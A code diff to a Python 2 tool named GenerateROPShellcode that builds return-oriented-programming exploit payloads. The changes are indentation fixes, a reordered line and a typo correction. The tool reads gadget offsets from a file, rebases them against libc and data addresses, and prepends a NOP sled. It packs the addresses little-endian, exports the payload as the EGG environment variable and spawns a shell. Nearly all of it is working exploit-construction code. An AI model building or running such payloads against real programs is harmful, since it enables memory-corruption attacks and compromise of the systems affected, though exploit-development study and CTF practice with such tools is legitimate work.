@@ -12,11 +12,11 @@ class GenerateROPShellcode(object):
     """
     def __init__(self, padding, _id, json_file):
         self._id = _id
+        self.code = ''
         self.padding = padding
         self.json_file = json_file
         self.libc_base = 0x0
         self.data_base = 0x0
-        self.code = ''
         self.addresses = []
         self.shellcode = ''
 
@@ -36,19 +36,19 @@ class GenerateROPShellcode(object):
     def construct_shellcode(self):
         commands = self.code.split('\n')
         for command in commands:
-        	tokens = command.split(':')
-        	if tokens[0].strip() == "ROP command":
-        		self.addresses.append(hex(int(self.libc_base.replace('L', ''), 16) + int(tokens[1].replace('L', ''), 16)))
-        	elif tokens[0].strip() == "Address":
-        		self.addresses.append(hex(int(self.data_base.replace('L', ''), 16) + int(tokens[1].replace('L', ''), 16)))
-        	else:
-        		self.addresses.append(hex(int(tokens[1].replace('L', ''), 16)))
+            tokens = command.split(':')
+            if tokens[0].strip() == "ROP command":
+                self.addresses.append(hex(int(self.libc_base.replace('L', ''), 16) + int(tokens[1].replace('L', '').strip(), 16)))
+            elif tokens[0].strip() == "Address":
+                self.addresses.append(hex(int(self.data_base.replace('L', ''), 16) + int(tokens[1].replace('L', '').strip(), 16)))
+            else:
+                self.addresses.append(hex(int(tokens[1].replace('L', '').strip(), 16)))
 
         for i in range(0, self.padding):
-        	self.shellcode += '90'.decode('hex')
+            self.shellcode += '90'.decode('hex')
 
         for address in self.addresses:
-        	self.shellcode += (address[2:].replace('L', '').zfill(8).decode('hex'))[::-1]
+            self.shellcode += (address[2:].replace('L', '').zfill(8).decode('hex'))[::-1]
 
         os.putenv('EGG', self.shellcode)
         subprocess.call('/bin/bash', shell=True)
@@ -56,7 +56,7 @@ class GenerateROPShellcode(object):
 
 def main():
     if len(sys.argv) < 4:
-        print 'Padding, ID of rop code and json file required required.\n'
+        print 'Padding, ID of rop code and json file required.\n'
     else:
         generator = GenerateROPShellcode(padding=int(sys.argv[1]),_id=int(sys.argv[2]), json_file=sys.argv[3])
         generator.get_code()
